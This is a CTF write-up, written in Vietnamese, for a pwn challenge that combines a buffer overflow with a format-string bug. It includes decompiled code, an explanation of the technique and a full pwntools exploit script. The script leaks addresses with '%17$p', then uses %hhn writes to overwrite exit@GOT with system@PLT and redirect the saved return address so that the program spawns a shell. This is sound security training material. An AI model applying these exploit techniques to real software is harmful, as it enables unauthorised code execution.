# ret2libc or format string

## IDA
```c
void __noreturn exit_f()
{
  exit((int)exit_code);
}

int win()
{
  return system("cat fmt");
}

__int64 fmt()
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  do
  {
    puts("den duoc day r ak");
    puts("phai lam gi day?????");
    fgets(s, 24, stdin);
    printf(s);                      // fmt
    putchar(10);
  }
  while ( strlen(s) <= 0xB );
  puts("end");
  return 0LL;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  init(argc, argv, envp);
  puts("ret2win or fmt");
  read(0, buf, 16uLL);      
  printf(buf);              //fmt
  puts("8==D");
  read(0, buf, 80uLL);      //bof
  return 0;
}
```

## Phân tích

- Đọc kĩ ida thì ta thấy có lỗi bof và fmt, có hàm system tuy nhiên nó chỉ thực hiện `cat fmt` không phải flag
- Lúc này ta cần đọc kĩ hơn nữa có hàm `exit_f` thực thi `exit(exit_code)` tuy nhiên khi bấm vào exit_code ta thấy có chuỗi /bin/sh
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/99b1693b-3546-4fdb-9590-38ac07f70edb)
- Tóm tắt lại hướng khai thác
    ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/9aacf585-d375-4911-8e56-3b0beb4a9ceb)

## Khai thác
### ret2win - dến hàm fmt()
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  init(argc, argv, envp);
  puts("ret2win or fmt");
  read(0, buf, 16uLL);      
  printf(buf);              //fmt
  puts("8==D");
  read(0, buf, 80uLL);      //bof
  return 0;
}
```

- Trong hàm main cho ta 2 lần nhập, có lỗi fmt và ret2win
- Do ta chỉ được sử dụng fmt 1 lần, nên ta sẽ dùng lỗi fmt để leak exe, tính exe base, và dùng lỗi ret2win để ghi đè saved rip trỏ đến fmt


```python
sa(b"fmt", b"%17$p")
p.recvline()
exe_leak = int(p.recv(14), 16)
exe.address = exe_leak - exe.sym['main']
info("exe leak: " + hex(exe.address))
sa(b"8==D", b"a"*72 + p64(exe.sym['fmt']+5))
```

- Do địa chỉ mình leak ra là `<main+0>` nên mình mới dùng `exe.address = exe_leak - exe.sym['main']` cho nhanh (`exe.sym['main']` là offset)

## ow exit.got() = system.plt()
- Lí do mình ow `exit.got` là như này:
    - `int system(const char *command)` hoạt động với 1 tham số rdi - Ví dụ: `system("cat flag.txt")`, thì nó sẽ thực thi lệnh `cat flag.txt`. Và thanh rdi nhận vào là một địa chỉ (ví dụ 0x1234 đang chứa chuỗi "cat flag.txt")
    - `void exit(int status);`
    - Cả `system()` và `exit()` đều chỉ sử dụng 1 tham số là rdi
    > Do đó khi exit() có thanh ghi rdi trỏ đến địa chỉ chứa `/bin/sh` thì mình mới nảy sinh ý tưởng là ow `exit()` thành `system()`
- Ý tưởng là vậy, ta nhìn vào code xem chương trình làm gì
```c
__int64 fmt()
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  do
  {
    puts("den duoc day r ak");
    puts("phai lam gi day?????");
    fgets(s, 24, stdin);
    printf(s);
    putchar(10);
  }
  while ( strlen(s) <= 0xB );
  puts("end");
  return 0LL;
}
```
- Hàm sẽ luôn kiểm tra payload của mình xem có vượt quá 12 kí tự không, nhưng nếu muốn khai thác lỗi fmt thì ta cần payload khá dài (cỡ 24byte)
- Một lí thuyết mới nữa là `strlen()` dừng đến khi gặp null byte, vậy bypass nó bằng cách nhập null byte ở đầu payload chăng?
- +1 lí thuyết nữa là hàm `printf()` đừng thực thi khi gặp null byte, vậy nên nhập null byte ở đầu là không khả thi =))
- Do vậy ta sẽ có payload như sau `%n + padding bằng nullbyte + địa chỉ`, 12 byte nhằm mục đích hạn chế số byte ow trong 1 lần fmt
- ví dụ: `%255c%10$hhn` thì ta được ow 1 byte thay vì 2 byte
- Leak 1 vài địa chỉ
```python
sla(b"?????", b"%17$p")
p.recvline()
stack_leak = int(p.recvline(keepends = False), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 0x100
info("ret: " + hex(ret))
```

- Ghi đè
```python
plt_system = exe.plt['system']
got_exit = exe.got['exit']
info("got exit: " + hex(got_exit))
info("plt system: " + hex(plt_system))
for i in range(0,6):
        info("" + str(i))
        payload = f"%{plt_system & 0xff}c%8$hhn".encode().ljust(16,b"\0") + p64(got_exit)
        sla(b"?????", payload)
        plt_system = plt_system >> 8
        got_exit+= 1
```
- Trước khi ow
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/491f8de4-684d-4321-b3a6-401071951a04)


- Sau khi ow
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/82072c58-c6a3-4edd-8c7c-d3cbeccbbd31)

## ow saved rip trỏ về exit_f
- tương tự như trên
```python
nowin = exe.sym['exit_f'] + 5
for i in range(0, 6):
        payload = f"%{nowin & 0xff}c%8$hhn".encode().ljust(16, b"\0") + p64(ret)
        sla(b"?????", payload)
        nowin = nowin >> 8
        ret += 1
sl(b"a"*15) # cố tình gây lỗi để thực thi return 
```

### Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/268fd3f1-3917-4885-8f01-f6c439576c9c)
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*fmt+93
                b*main+130
                b*fmt+126
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

sa(b"fmt", b"%17$p")
p.recvline()
exe_leak = int(p.recv(14), 16)
exe.address = exe_leak - exe.sym['main']
info("exe leak: " + hex(exe.address))
sa(b"8==D", b"a"*72 + p64(exe.sym['fmt']+5))


sla(b"?????", b"%17$p")
p.recvline()
stack_leak = int(p.recvline(keepends = False), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 0x100
info("ret: " + hex(ret))

plt_system = exe.plt['system']
got_exit = exe.got['exit']

info("got exit: " + hex(got_exit))
info("plt system: " + hex(plt_system))
for i in range(0,6):
        info("" + str(i))
        payload = f"%{plt_system & 0xff}c%8$hhn".encode().ljust(16,b"\0") + p64(got_exit)
        sla(b"?????", payload)
        plt_system = plt_system >> 8
        got_exit+= 1
nowin = exe.sym['exit_f'] + 5
for i in range(0, 6):
        payload = f"%{nowin & 0xff}c%8$hhn".encode().ljust(16, b"\0") + p64(ret)
        sla(b"?????", payload)
        nowin = nowin >> 8
        ret += 1
sl(b"a"*15) # cố tình gây lỗi để thực thi return 

p.interactive()
```
